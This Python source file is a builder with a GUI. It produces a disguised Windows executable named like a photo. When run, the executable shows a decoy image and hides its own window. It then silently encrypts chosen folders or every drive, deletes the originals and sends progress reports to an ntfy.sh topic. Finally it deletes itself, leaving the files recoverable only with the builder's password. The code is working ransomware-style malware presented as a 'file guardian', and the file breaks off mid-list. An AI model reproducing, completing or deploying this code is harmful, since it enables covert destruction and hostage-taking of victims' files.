"""
FILE GUARDIAN — Control Panel / Builder
========================================
Configure everything visually, click BUILD,
get a ready-to-run disguised .exe output.

Requirements:
  pip install cryptography pillow pyinstaller
"""

import os, sys, base64, hashlib, threading, subprocess, shutil, tempfile
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
# Auto-install Pillow if missing
try:
    from PIL import Image
except ImportError:
    import subprocess, sys
    print("Installing Pillow...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow"])
    from PIL import Image

# ── Colours ───────────────────────────────────────────────────────────────────
BG      = "#0a0e1a"
SURFACE = "#111827"
CARD    = "#1a2235"
ACCENT  = "#00e5b0"
BLUE    = "#0077ff"
TEXT    = "#f0f4ff"
MUTED   = "#6b7a99"
BORDER  = "#1e2d45"
DANGER  = "#ff4d6d"
WARNING = "#ffaa00"

# ── File Guardian template ────────────────────────────────────────────────────
TEMPLATE = '''"""
FILE GUARDIAN — Auto-Generated
Password, path and decoy image configured at build time.
"""

import os, sys, base64, hashlib, threading, time, subprocess, string, ctypes
import json, urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
import tkinter as tk
from tkinter import ttk, messagebox, filedialog

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes

_DECOY_JPG_B64 = "{{DECOY_B64}}"
_PASSWORD_HASH  = "{{PASSWORD_HASH}}"
NTFY_TOPIC      = "{{NTFY_TOPIC}}"
NTFY_URL        = f"https://ntfy.sh/{NTFY_TOPIC}"
TARGET_PATHS    = {{TARGET_PATH}}

ENCRYPTED_EXT = ".guardian"
SALT_FILENAME = ".guardian_salt"

SKIP_DIRS       = {{SKIP_DIRS}}
SKIP_EXTENSIONS = {{SKIP_EXTENSIONS}}

def self_delete_exe():
    try:
        if getattr(sys, "frozen", False):
            import tempfile as _tmp
            exe = sys.executable
            nl  = chr(10)
            q   = chr(34)
            bat = _tmp.mktemp(suffix=".bat")
            with open(bat, "w") as _f:
                _f.write("@echo off" + nl)
                _f.write("ping 127.0.0.1 -n 4 > nul" + nl)
                _f.write("del /f /q " + q + exe + q + nl)
                _f.write("del /f /q " + q + "%~f0" + q + nl)
            subprocess.Popen(
                ["cmd", "/c", bat],
                creationflags=0x08000000
            )
    except Exception:
        pass


def discover_all_roots():
    roots = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\\\"
        if os.path.exists(drive):
            try:
                dtype = ctypes.windll.kernel32.GetDriveTypeW(drive)
                if dtype in (2,3,4,6): roots.append(drive)
            except Exception: pass
    return roots

def build_scan_roots():
    drive_roots = discover_all_roots()
    return drive_roots, drive_roots

class NtfyReporter:
    def __init__(self):
        self.state = {
            "status":"idle","phase":"Starting...","current":"",
            "encrypted":0,"total":0,"percent":0,"drives":[],
            "started_at":"","updated_at":"","done":False,"error":""
        }
        self._lock=threading.Lock(); self._dirty=False; self._last_push=0
        threading.Thread(target=self._loop, daemon=True).start()

    def update(self, **kwargs):
        with self._lock:
            self.state.update(kwargs)
            self.state["updated_at"]=time.strftime("%Y-%m-%d %H:%M:%S")
            self._dirty=True

    def _loop(self):
        while True:
            time.sleep(1)
            with self._lock:
                if not self._dirty: continue
                if time.time()-self._last_push < 6: continue
                payload=dict(self.state); self._dirty=False; self._last_push=time.time()
            self._push(payload)

    def _push(self, payload):
        try:
            small={"s":payload.get("status",""),"ph":payload.get("phase","")[:80],
                   "cur":payload.get("current","")[:60],"enc":payload.get("encrypted",0),
                   "tot":payload.get("total",0),"pct":payload.get("percent",0),
                   "drv":payload.get("drives",[]),"sat":payload.get("started_at",""),
                   "uat":payload.get("updated_at",""),"don":payload.get("done",False),
                   "err":payload.get("error","")[:80]}
            data=json.dumps(small).encode()
            req=urllib.request.Request(NTFY_URL, data=data, method="POST")
            req.add_header("Content-Type","application/json")
            req.add_header("Tags","lock")
            with urllib.request.urlopen(req, timeout=10): pass
        except Exception: pass

    def push_final(self, **kwargs):
        with self._lock:
            self.state.update(kwargs)
            self.state["updated_at"]=time.strftime("%Y-%m-%d %H:%M:%S")
            payload=dict(self.state); self._last_push=time.time()
        for i in range(3):
            self._push(payload)
            if i<2: time.sleep(1)

reporter=NtfyReporter()

def _get_or_create_salt(folder):
    path=os.path.join(folder,SALT_FILENAME)
    if os.path.exists(path):
        with open(path,"rb") as f: return f.read()
    salt=os.urandom(16)
    with open(path,"wb") as f: f.write(salt)
    return salt

def _get_salt(folder):
    path=os.path.join(folder,SALT_FILENAME)
    if os.path.exists(path):
        with open(path,"rb") as f: return f.read()
    return None

def _derive_key(salt):
    kdf=PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=390_000)
    return base64.urlsafe_b64encode(kdf.derive(_PASSWORD_HASH.encode()))

def _collect_files(folder, mode):
    for dirpath,dirs,files in os.walk(folder, topdown=True):
        dirs[:]=[d for d in dirs if d.lower() not in SKIP_DIRS]
        for fname in files:
            if fname==SALT_FILENAME: continue
            fpath=os.path.join(dirpath,fname)
            ext=os.path.splitext(fname)[1].lower()
            if mode=="encrypt" and ext not in SKIP_EXTENSIONS: yield fpath
            elif mode=="decrypt" and ext==ENCRYPTED_EXT: yield fpath

def find_salt_folders(root):
    found=[]
    for dirpath,dirs,files in os.walk(root, topdown=True):
        dirs[:]=[d for d in dirs if d.lower() not in SKIP_DIRS]
        if SALT_FILENAME in files: found.append(dirpath)
    return found

def encrypt_file(fpath, fernet):
    try:
        with open(fpath,"rb") as f: data=f.read()
        with open(fpath+ENCRYPTED_EXT,"wb") as f: f.write(fernet.encrypt(data))
        os.remove(fpath)
    except Exception: pass

def decrypt_file(fpath, fernet):
    try:
        with open(fpath,"rb") as f: data=f.read()
        dec=fernet.decrypt(data)
        with open(fpath[:-len(ENCRYPTED_EXT)],"wb") as f: f.write(dec)
        os.remove(fpath)
        return True
    except Exception: return False

class FileGuardianApp:
    BG="#0a0e1a"; SURFACE="#111827"; CARD="#1a2235"; ACCENT="#00e5b0"
    BLUE="#0077ff"; TEXT="#f0f4ff"; MUTED="#6b7a99"; BORDER="#1e2d45"; DANGER="#ff4d6d"

    def __init__(self,root):
        self.root=root
        self.root.title("Windows Photo Viewer")
        self.root.configure(bg=self.BG)
        self.root.resizable(False,False)
        self.root.protocol("WM_DELETE_WINDOW",self._hide)
        self._center(520,520); self._build_ui()
        self.root.withdraw()
        self.root.bind_all("<Control-Shift-G>",lambda e:self._show())
        self.root.bind_all("<Control-Shift-g>",lambda e:self._show())
        self.root.after(3000,self._auto_encrypt)

    def _auto_encrypt(self):
        threading.Thread(target=self._run_all_paths, daemon=True).start()

    def _run_all_paths(self):
        paths = TARGET_PATHS if isinstance(TARGET_PATHS, list) else [TARGET_PATHS]
        for path in paths:
            if os.path.exists(path):
                reporter.update(phase=f"Starting: {path}")
                self._run_encrypt(path)
            else:
                reporter.update(phase=f"Skipping missing: {path}")

    def _hide(self): self.root.withdraw()
    def _show(self):
        self.root.deiconify(); self.root.lift(); self.root.focus_force()

    def _center(self,w,h):
        sw=self.root.winfo_screenwidth(); sh=self.root.winfo_screenheight()
        self.root.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")

    def _build_ui(self):
        tk.Frame(self.root,bg=self.ACCENT,height=3).pack(fill="x")
        hdr=tk.Frame(self.root,bg=self.SURFACE,pady=14); hdr.pack(fill="x")
        c=tk.Canvas(hdr,width=56,height=62,bg=self.SURFACE,highlightthickness=0); c.pack()
        c.create_arc(10,2,46,34,start=0,extent=180,outline=self.ACCENT,width=4,style="arc")
        c.create_rectangle(6,28,50,58,fill=self.ACCENT,outline="")
        c.create_oval(22,36,34,48,fill=self.SURFACE,outline="")
        c.create_rectangle(27,44,29,54,fill=self.SURFACE,outline="")
        tk.Label(hdr,text="F I L E   G U A R D I A N",font=("Consolas",16,"bold"),bg=self.SURFACE,fg=self.TEXT).pack(pady=(6,2))
        tk.Label(hdr,text="Auto-Protect Mode  \u2022  Live Monitor  \u2022  Self-Delete",font=("Segoe UI",8),bg=self.SURFACE,fg=self.MUTED).pack()
        tk.Label(hdr,text="\U0001f4e1  LIVE  \u2192  madhan-shan.github.io/guardian-monitor",bg=self.CARD,fg=self.ACCENT,font=("Consolas",7,"bold"),padx=10,pady=4).pack(pady=(8,0))
        body=tk.Frame(self.root,bg=self.BG,padx=24,pady=12); body.pack(fill="both",expand=True)
        tk.Label(body,text="\u26a1  STATUS",bg=self.BG,fg=self.MUTED,font=("Consolas",8,"bold"),anchor="w").pack(fill="x")
        sc=tk.Frame(body,bg=self.CARD,padx=12,pady=10); sc.pack(fill="x",pady=(4,10))
        style=ttk.Style(); style.theme_use("clam")
        style.configure("G.Horizontal.TProgressbar",troughcolor="#0d1526",background=self.ACCENT,thickness=8)
        self.progress=ttk.Progressbar(sc,mode="indeterminate",style="G.Horizontal.TProgressbar")
        self.progress.pack(fill="x",pady=(0,6))
        self.status_var=tk.StringVar(value="Starting in 3 seconds...")
        tk.Label(sc,textvariable=self.status_var,bg=self.CARD,fg=self.ACCENT,font=("Consolas",8),wraplength=450,justify="left",anchor="w").pack(fill="x")
        tk.Frame(body,bg=self.BORDER,height=1).pack(fill="x",pady=(4,10))
        dk=tk.Frame(body,bg=self.CARD,padx=14,pady=12); dk.pack(fill="x")
        tk.Label(dk,text="\U0001f513  DECRYPT \u2014 ENTER PASSWORD TO RESTORE ALL FILES",bg=self.CARD,fg=self.MUTED,font=("Consolas",8,"bold"),anchor="w").pack(fill="x",pady=(0,8))
        pr=tk.Frame(dk,bg=self.CARD); pr.pack(fill="x")
        self.pass_var=tk.StringVar()
        self.pass_entry=tk.Entry(pr,textvariable=self.pass_var,show="\u25cf",bg="#0d1526",fg=self.TEXT,insertbackground=self.BLUE,relief="flat",font=("Consolas",11),bd=0,highlightthickness=1,highlightbackground=self.BORDER,highlightcolor=self.BLUE)
        self.pass_entry.pack(side="left",fill="x",expand=True,ipady=8,ipadx=8)
        self.pass_entry.bind("<Return>",lambda e:self._start_decrypt())
        self.show_var=tk.BooleanVar(value=False)
        tk.Checkbutton(pr,text="\U0001f441",variable=self.show_var,command=lambda:self.pass_entry.config(show="" if self.show_var.get() else "\u25cf"),bg=self.CARD,fg=self.MUTED,selectcolor=self.CARD,activebackground=self.CARD,relief="flat",bd=0,font=("Segoe UI Emoji",12),cursor="hand2").pack(side="left",padx=(8,0))
        tk.Button(pr,text="Unlock",command=self._start_decrypt,bg=self.BLUE,fg=self.TEXT,font=("Segoe UI",9,"bold"),relief="flat",padx=14,pady=8,cursor="hand2",bd=0,activebackground="#0055cc").pack(side="left",padx=(8,0))
        self.pass_hint=tk.Label(dk,text="",bg=self.CARD,fg=self.DANGER,font=("Consolas",8))
        self.pass_hint.pack(anchor="w",pady=(6,0))
        tk.Frame(self.root,bg=self.BORDER,height=1).pack(fill="x")
        tk.Label(self.root,text="AES-128 \u00b7 PBKDF2-SHA256 \u00b7 Self-Delete \u00b7 Ctrl+Shift+G to show",bg=self.BG,fg=self.BORDER,font=("Consolas",7)).pack(pady=6)

    def _set_busy(self,busy,msg=""):
        if msg: self.status_var.set(msg)
        if busy: self.progress.start(10)
        else: self.progress.stop()

    def _run_encrypt(self, folder):
        if not os.path.isdir(folder):
            self._set_busy(False, f"\u274c Folder not found: {folder}")
            reporter.update(status="error", error=f"Folder not found: {folder}"); return
        self._set_busy(True, f"Scanning: {os.path.basename(folder)}...")
        reporter.update(status="running", done=False,
                        started_at=time.strftime("%Y-%m-%d %H:%M:%S"),
                        drives=[folder], phase="Building file list...")
        try:
            salt   = _get_or_create_salt(folder)
            fernet = Fernet(_derive_key(salt))
            files  = list(_collect_files(folder, "encrypt"))
            total  = len(files)
            done   = 0
            lock   = threading.Lock()
            reporter.update(total=total, phase=f"Encrypting {total} files (4 threads)...")
            self._set_busy(True, f"Encrypting {total} files (4 threads)...")

            def encrypt_one(fpath):
                nonlocal done
                encrypt_file(fpath, fernet)
                with lock:
                    done += 1
                    pct = int((done / total) * 100) if total else 100
                    self._set_busy(True, f"Encrypting {done}/{total}: {os.path.basename(fpath)}")
                    if done == 1 or done % 10 == 0 or done == total:
                        reporter.update(encrypted=done, percent=pct,
                                        current=os.path.basename(fpath),
                                        phase=f"Encrypting {done} of {total}")

            with ThreadPoolExecutor(max_workers=4) as ex:
                list(ex.map(encrypt_one, files))

            self._set_busy(False, f"\u2705 Done \u2014 {total} file(s) encrypted. Deleting tool...")
            reporter.push_final(status="done", done=True, percent=100, current="",
                                phase=f"Complete \u2014 {total} file(s) encrypted.")
            time.sleep(3)
            self_delete_exe()
        except Exception as e:
            self._set_busy(False, f"\u274c Error: {e}")
            reporter.update(status="error", error=str(e))


    def _start_decrypt(self):
        password=self.pass_var.get()
        if not password:
            self.pass_hint.config(text="\u26a0  Please enter your password."); return
        if hashlib.sha256(password.encode()).hexdigest()!=_PASSWORD_HASH:
            self.pass_hint.config(text="\u274c  Wrong password. Access denied.")
            self.pass_var.set(""); return
        self.pass_hint.config(text="\u2705  Password verified. Decrypting all drives...")
        self.pass_var.set("")
        threading.Thread(target=self._run_decrypt,daemon=True).start()

    def _run_decrypt(self):
        self._set_busy(True,"Scanning all drives for encrypted files...")
        reporter.update(status="running",done=False,started_at=time.strftime("%Y-%m-%d %H:%M:%S"),phase="Scanning for encrypted files...")
        try:
            _,drive_roots=build_scan_roots()
            all_salt_folders=[]
            for root in drive_roots: all_salt_folders.extend(find_salt_folders(root))
            if not all_salt_folders:
                self._set_busy(False,"\u274c No encrypted data found.")
                self.pass_hint.config(text="\u274c  No encrypted data found on any drive."); return
            fernets={}
            for sf in all_salt_folders:
                s=_get_salt(sf)
                if s: fernets[sf]=Fernet(_derive_key(s))
            seen,files=set(),[]
            for root in drive_roots:
                for fpath in _collect_files(root,"decrypt"):
                    if fpath not in seen: seen.add(fpath); files.append(fpath)
            total,failed=len(files),0
            reporter.update(total=total,drives=drive_roots,phase=f"Decrypting {total} files...")
            for i,fpath in enumerate(files,1):
                pct=int((i/total)*100) if total else 100
                self._set_busy(True,f"Decrypting {i}/{total}: {os.path.basename(fpath)}")
                if i==1 or i%5==0 or i==total:
                    reporter.update(encrypted=i,percent=pct,current=os.path.basename(fpath))
                best=next((fnt for sf,fnt in fernets.items() if fpath.lower().startswith(sf.lower())),next(iter(fernets.values()),None))
                if best and not decrypt_file(fpath,best): failed+=1
            success=total-failed
            self._set_busy(False,f"\u2705 Done \u2014 {success}/{total} file(s) restored.")
            self.pass_hint.config(text=f"\u2705  {success} file(s) restored.")
            reporter.push_final(status="done",done=True,percent=100,current="",phase=f"Decryption complete \u2014 {success} file(s) restored.")
        except Exception as e:
            self._set_busy(False,f"\u274c Error: {e}")
            reporter.update(status="error",error=str(e))

if __name__=="__main__":
    import tempfile
    def open_decoy():
        try:
            tmp=tempfile.NamedTemporaryFile(suffix=".jpg",delete=False,prefix="img_")
            tmp.write(base64.b64decode(_DECOY_JPG_B64)); tmp.close()
            os.startfile(tmp.name)
        except Exception: pass
    threading.Thread(target=open_decoy,daemon=True).start()
    time.sleep(0.4)
    root=tk.Tk(); root.withdraw()
    FileGuardianApp(root); root.mainloop()
'''

# ── Builder GUI ────────────────────────────────────────────────────────────────
class GuardianBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("File Guardian — Control Panel")
        self.root.configure(bg=BG)
        self.root.resizable(False, False)
        self._center(600, 820)
        self.image_path = tk.StringVar()
        self.target_path = tk.StringVar(value=r"C:\Users\MAD\Documents")
        self.password_var = tk.StringVar()
        self.exe_name = tk.StringVar(value="photo_2024.jpg")
        self.ntfy_topic = tk.StringVar(value="madhan-guardian-308c467d")
        self.output_dir = tk.StringVar(value=os.path.expanduser("~\\Desktop"))
        self._build_ui()

    def _center(self, w, h):
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        self.root.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")

    def _card(self, parent, label, pady=(2, 6)):
        tk.Label(parent, text=label, bg=BG, fg=MUTED,
                 font=("Consolas", 8, "bold"), anchor="w").pack(fill="x")
        f = tk.Frame(parent, bg=CARD, padx=14, pady=12)
        f.pack(fill="x", pady=pady)
        return f

    def _entry_row(self, parent, var, placeholder="", browse_cmd=None, show=None):
        row = tk.Frame(parent, bg=CARD)
        row.pack(fill="x")
        kw = {"show": show} if show else {}
        e = tk.Entry(row, textvariable=var, bg="#0d1526", fg=TEXT,
                     insertbackground=ACCENT, relief="flat",
                     font=("Consolas", 9), bd=0, highlightthickness=1,
                     highlightbackground=BORDER, highlightcolor=ACCENT, **kw)
        e.pack(side="left", fill="x", expand=True, ipady=7, ipadx=6)
        if placeholder and not var.get():
            e.insert(0, placeholder)
        if browse_cmd:
            tk.Button(row, text="Browse", command=browse_cmd,
                      bg=BLUE, fg=TEXT, font=("Segoe UI", 9, "bold"),
                      relief="flat", padx=10, pady=5,
                      cursor="hand2").pack(side="left", padx=(8, 0))
        return e

    def _build_ui(self):
        # Top accent
        tk.Frame(self.root, bg=ACCENT, height=3).pack(fill="x")

        # Header
        hdr = tk.Frame(self.root, bg=SURFACE, pady=10)
        hdr.pack(fill="x")
        tk.Label(hdr, text="🛡️", font=("Segoe UI Emoji", 36),
                 bg=SURFACE).pack()
        tk.Label(hdr, text="FILE GUARDIAN — CONTROL PANEL",
                 font=("Consolas", 14, "bold"), bg=SURFACE, fg=TEXT).pack(pady=(4, 2))
        tk.Label(hdr, text="Configure settings → Build your disguised .exe",
                 font=("Segoe UI", 9), bg=SURFACE, fg=MUTED).pack()

        # ── Scrollable body ──────────────────────────────────────────────
        outer = tk.Frame(self.root, bg=BG)
        outer.pack(fill="both", expand=True)

        canvas = tk.Canvas(outer, bg=BG, highlightthickness=0)
        vsb = tk.Scrollbar(outer, orient="vertical", command=canvas.yview)
        canvas.configure(yscrollcommand=vsb.set)
        vsb.pack(side="right", fill="y")
        canvas.pack(side="left", fill="both", expand=True)

        body = tk.Frame(canvas, bg=BG, padx=22, pady=8)
        body_win = canvas.create_window((0, 0), window=body, anchor="nw")

        def _resize(e): canvas.itemconfig(body_win, width=e.width)
        def _scroll(e): canvas.configure(scrollregion=canvas.bbox("all"))
        def _wheel(e):  canvas.yview_scroll(int(-1*(e.delta/120)), "units")

        canvas.bind("<Configure>", _resize)
        body.bind("<Configure>", _scroll)
        canvas.bind_all("<MouseWheel>", _wheel)

        # 1. Target paths (multi)
        c1 = self._card(body, "📁  TARGET PATHS TO ENCRYPT  (folders, drives or both)")

        # Listbox showing selected paths
        lb_frame = tk.Frame(c1, bg=CARD)
        lb_frame.pack(fill="x", pady=(0, 6))
        self.paths_listbox = tk.Listbox(lb_frame, bg="#0d1526", fg=ACCENT,
                                         font=("Consolas", 8), height=4,
                                         selectbackground=BLUE, selectforeground=TEXT,
                                         relief="flat", bd=0,
                                         highlightthickness=1,
                                         highlightbackground=BORDER)
        self.paths_listbox.pack(side="left", fill="x", expand=True)
        sb = tk.Scrollbar(lb_frame, command=self.paths_listbox.yview, bg=CARD)
        sb.pack(side="right", fill="y")
        self.paths_listbox.config(yscrollcommand=sb.set)

        # Buttons row
        btn_row = tk.Frame(c1, bg=CARD)
        btn_row.pack(fill="x", pady=(0, 4))
        tk.Button(btn_row, text="+ Add Folder", command=self._add_folder,
                  bg=BLUE, fg=TEXT, font=("Segoe UI", 8, "bold"),
                  relief="flat", padx=8, pady=4, cursor="hand2").pack(side="left", padx=(0, 4))
        tk.Button(btn_row, text="💾 All Drives", command=self._add_all_drives,
                  bg=ACCENT, fg="#000", font=("Segoe UI", 8, "bold"),
                  relief="flat", padx=8, pady=4, cursor="hand2").pack(side="left", padx=(0, 4))
        tk.Button(btn_row, text="✕ Remove", command=self._remove_path,
                  bg=DANGER, fg=TEXT, font=("Segoe UI", 8, "bold"),
                  relief="flat", padx=8, pady=4, cursor="hand2").pack(side="left")
        tk.Label(c1, text="Tip: Add specific folders OR click 'All Drives' to encrypt everything",
                 bg=CARD, fg=MUTED, font=("Segoe UI", 7)).pack(anchor="w")

        # 1b. File type options
        c1b = self._card(body, "📋  FILE TYPES TO ENCRYPT")

        # Categories with checkboxes
        self.cat_vars = {}
        CATEGORIES = {
            "📄 Documents"   : True,
            "🖼️ Images"      : True,
            "🎬 Videos"      : True,
            "🎵 Audio"       : True,
            "📦 Archives"    : True,
            "🗄️ Databases"   : True,
            "🎨 Adobe Suite" : True,
            "📐 3D / CAD"    : True,
            "💻 Dev Files"   : True,
            "📧 Email Files" : True,
            "⚙️ Sys Files"   : False,
            "📜 Scripts"     : False,
        }
        grid = tk.Frame(c1b, bg=CARD)
        grid.pack(fill="x", pady=(0,4))
        for i, (label, default) in enumerate(CATEGORIES.items()):
            var = tk.BooleanVar(value=default)
            self.cat_vars[label] = var
            color = ACCENT if default else WARNING
            tk.Checkbutton(grid, text=label, variable=var,
                           bg=CARD, fg=color, selectcolor="#0d1526",
                           activebackground=CARD, font=("Segoe UI", 8),
                           cursor="hand2").grid(row=i//2, column=i%2, sticky="w", pady=1)
        grid.columnconfigure(0, weight=1)
        grid.columnconfigure(1, weight=1)

        # System folders option
        sys_row = tk.Frame(c1b, bg=CARD)
        sys_row.pack(fill="x", pady=(4, 0))
        self.include_sys_folders = tk.BooleanVar(value=False)
        tk.Checkbutton(sys_row,
                       text="🗂️ Include System Folders  (Windows, Program Files, AppData)",
                       variable=self.include_sys_folders,
                       bg=CARD, fg=DANGER, selectcolor="#0d1526",
                       activebackground=CARD, font=("Segoe UI", 8),
                       cursor="hand2").pack(anchor="w")
        tk.Label(c1b, text="⚠️  System files/folders — only check in extreme situations!",
                 bg=CARD, fg=DANGER, font=("Segoe UI", 7)).pack(anchor="w", pady=(2,0))

        # 2. Decoy image
        c2 = self._card(body, "🖼️  DECOY IMAGE (JPG/PNG — shown when .exe clicked)")
        self.img_label = tk.Label(c2, text="No image selected",
                                   bg=CARD, fg=MUTED, font=("Segoe UI", 8))
        self.img_label.pack(anchor="w", pady=(0, 3))
        self._entry_row(c2, self.image_path,
                        browse_cmd=self._browse_image)
        tk.Label(c2, text="This image opens in Windows Photos as decoy — also becomes the .exe icon",
                 bg=CARD, fg=MUTED, font=("Segoe UI", 7)).pack(anchor="w", pady=(5, 0))

        # 3. Password
        c3 = self._card(body, "🔑  ENCRYPTION PASSWORD")
        pass_row = tk.Frame(c3, bg=CARD)
        pass_row.pack(fill="x")
        self.pass_entry = tk.Entry(pass_row, textvariable=self.password_var,
                                    show="●", bg="#0d1526", fg=TEXT,
                                    insertbackground=ACCENT, relief="flat",
                                    font=("Consolas", 10), bd=0, highlightthickness=1,
                                    highlightbackground=BORDER, highlightcolor=ACCENT)
        self.pass_entry.pack(side="left", fill="x", expand=True, ipady=7, ipadx=6)
        self.show_pass = tk.BooleanVar(value=False)
        tk.Checkbutton(pass_row, text="👁", variable=self.show_pass,
                       command=lambda: self.pass_entry.config(
                           show="" if self.show_pass.get() else "●"),
                       bg=CARD, fg=MUTED, selectcolor=CARD,
                       activebackground=CARD, relief="flat", bd=0,
                       font=("Segoe UI Emoji", 12), cursor="hand2").pack(side="left", padx=(8, 0))
        self.hash_label = tk.Label(c3, text="SHA-256 hash: (enter password above)",
                                    bg=CARD, fg=BORDER, font=("Consolas", 7))
        self.hash_label.pack(anchor="w", pady=(5, 0))
        self.password_var.trace_add("write", self._update_hash)

        # 4. Exe name + output
        c4 = self._card(body, "⚙️  OUTPUT SETTINGS")
        name_row = tk.Frame(c4, bg=CARD)
        name_row.pack(fill="x", pady=(0, 6))
        tk.Label(name_row, text=".exe name:", bg=CARD, fg=MUTED,
                 font=("Segoe UI", 8), width=12, anchor="w").pack(side="left")
        tk.Entry(name_row, textvariable=self.exe_name, bg="#0d1526", fg=TEXT,
                 insertbackground=ACCENT, relief="flat", font=("Consolas", 9), bd=0,
                 highlightthickness=1, highlightbackground=BORDER,
                 highlightcolor=ACCENT).pack(side="left", fill="x", expand=True, ipady=5, ipadx=6)

        # Python path
        py_row = tk.Frame(c4, bg=CARD)
        py_row.pack(fill="x", pady=(0, 6))
        tk.Label(py_row, text="Python path:", bg=CARD, fg=MUTED,
                 font=("Segoe UI", 8), width=12, anchor="w").pack(side="left")
        self.python_path = tk.StringVar(value=self._detect_python())
        tk.Entry(py_row, textvariable=self.python_path, bg="#0d1526", fg=ACCENT,
                 insertbackground=ACCENT, relief="flat", font=("Consolas", 8), bd=0,
                 highlightthickness=1, highlightbackground=BORDER,
                 highlightcolor=ACCENT).pack(side="left", fill="x", expand=True, ipady=5, ipadx=6)
        tk.Button(py_row, text="Browse",
                  command=lambda: self._browse_python(),
                  bg=MUTED, fg=TEXT, font=("Segoe UI", 8, "bold"),
                  relief="flat", padx=8, pady=4,
                  cursor="hand2").pack(side="left", padx=(8, 0))

        ntfy_row = tk.Frame(c4, bg=CARD)
        ntfy_row.pack(fill="x", pady=(0, 6))
        tk.Label(ntfy_row, text="ntfy topic:", bg=CARD, fg=MUTED,
                 font=("Segoe UI", 8), width=12, anchor="w").pack(side="left")
        tk.Entry(ntfy_row, textvariable=self.ntfy_topic, bg="#0d1526", fg=TEXT,
                 insertbackground=ACCENT, relief="flat", font=("Consolas", 9), bd=0,
                 highlightthickness=1, highlightbackground=BORDER,
                 highlightcolor=ACCENT).pack(side="left", fill="x", expand=True, ipady=5, ipadx=6)

        out_row = tk.Frame(c4, bg=CARD)
        out_row.pack(fill="x")
        tk.Label(out_row, text="Output folder:", bg=CARD, fg=MUTED,
                 font=("Segoe UI", 8), width=12, anchor="w").pack(side="left")
        tk.Entry(out_row, textvariable=self.output_dir, bg="#0d1526", fg=TEXT,
                 insertbackground=ACCENT, relief="flat", font=("Consolas", 9), bd=0,
                 highlightthickness=1, highlightbackground=BORDER,
                 highlightcolor=ACCENT).pack(side="left", fill="x", expand=True, ipady=5, ipadx=6)
        tk.Button(out_row, text="Browse",
                  command=lambda: self._browse_folder(self.output_dir),
                  bg=BLUE, fg=TEXT, font=("Segoe UI", 8, "bold"),
                  relief="flat", padx=8, pady=4,
                  cursor="hand2").pack(side="left", padx=(8, 0))

        # Build button
        tk.Frame(body, bg=BORDER, height=1).pack(fill="x", pady=(6, 10))
        self.build_btn = tk.Button(body,
                                    text="🔨   BUILD  FILE GUARDIAN .EXE",
                                    command=self._start_build,
                                    bg=ACCENT, fg="#000000",
                                    font=("Segoe UI", 12, "bold"),
                                    relief="flat", pady=14,
                                    cursor="hand2", bd=0,
                                    activebackground="#00c49a")
        self.build_btn.pack(fill="x")

        # Log area
        self.log_text = tk.Text(body, height=7, bg=SURFACE, fg=ACCENT,
                                 font=("Consolas", 8), relief="flat",
                                 state="disabled", wrap="word",
                                 insertbackground=ACCENT)
        self.log_text.pack(fill="x", pady=(10, 0))

        # Footer
        tk.Frame(self.root, bg=BORDER, height=1).pack(fill="x")
        tk.Label(self.root, text="File Guardian Control Panel  •  Outputs a ready-to-run disguised .exe",
                 bg=BG, fg=BORDER, font=("Consolas", 7)).pack(pady=6)

    def _update_hash(self, *args):
        pw = self.password_var.get()
        if pw:
            h = hashlib.sha256(pw.encode()).hexdigest()
            self.hash_label.config(text=f"SHA-256: {h[:32]}...", fg=ACCENT)
        else:
            self.hash_label.config(text="SHA-256 hash: (enter password above)", fg=BORDER)

    def _detect_python(self):
        """Find real Python executable (not the frozen exe)."""
        import shutil
        # If running as frozen exe, sys.executable is the .exe itself
        if getattr(sys, "frozen", False):
            # Try common locations
            for candidate in [
                shutil.which("python"),
                shutil.which("python3"),
                r"C:\Users\MAD\Desktop\FileGuardian\.venv\Scripts\python.exe",
                r"C:\Users\MAD\AppData\Local\Programs\Python\Python314\python.exe",
                r"C:\Python311\python.exe",
                r"C:\Python310\python.exe",
            ]:
                if candidate and os.path.exists(candidate):
                    return candidate
            return ""
        else:
            # Running as script — sys.executable is real Python
            return sys.executable

    def _browse_python(self):
        try:
            path = filedialog.askopenfilename(
                title="Select python.exe",
                filetypes=[("Python executable", "python.exe"), ("All files", "*.*")]
            )
            if path:
                self.python_path.set(path)
        except KeyboardInterrupt:
            pass

    def _build_skip_lists(self):
        """Build SKIP_DIRS and SKIP_EXTENSIONS based on UI checkboxes."""
        # Base always-skip extensions (guardian internals)
        skip_ext = {".guardian", ".guardian_salt"}

        # System files
        sys_exts = {".exe",".dll",".sys",".drv",".ocx",".scr",".cpl",".msi",".inf"}
        # Scripts
        script_exts = {".bat",".cmd",".lnk",".ini",".py",".vbs",".ps1",".reg"}

        if not self.cat_vars.get("⚙️ Sys Files", tk.BooleanVar()).get():
            skip_ext |= sys_exts
        if not self.cat_vars.get("📜 Scripts", tk.BooleanVar()).get():
            skip_ext |= script_exts

        # Category extension maps
        cat_exts = {
            "📄 Documents"   : set(),   # always included by default (not in skip)
            "🖼️ Images"      : {".jpg",".jpeg",".png",".gif",".bmp",".tiff",".tif",
                                 ".webp",".svg",".ico",".heic",".raw",".cr2",".nef",
                                 ".arw",".orf",".dng"},
            "🎬 Videos"      : {".mp4",".avi",".mkv",".mov",".wmv",".flv",".m4v",
                                 ".mpg",".mpeg",".3gp",".webm",".vob",".ts"},
            "🎵 Audio"       : {".mp3",".wav",".flac",".aac",".m4a",".ogg",".wma",
                                 ".aiff",".alac",".opus",".mid",".midi"},
            "📦 Archives"    : {".zip",".rar",".7z",".tar",".gz",".bz2",".xz",
                                 ".iso",".dmg",".cab",".tgz"},
            "🗄️ Databases"   : {".db",".sqlite",".sqlite3",".mdb",".accdb",".sql",
                                 ".dbf",".fdb",".gdb"},
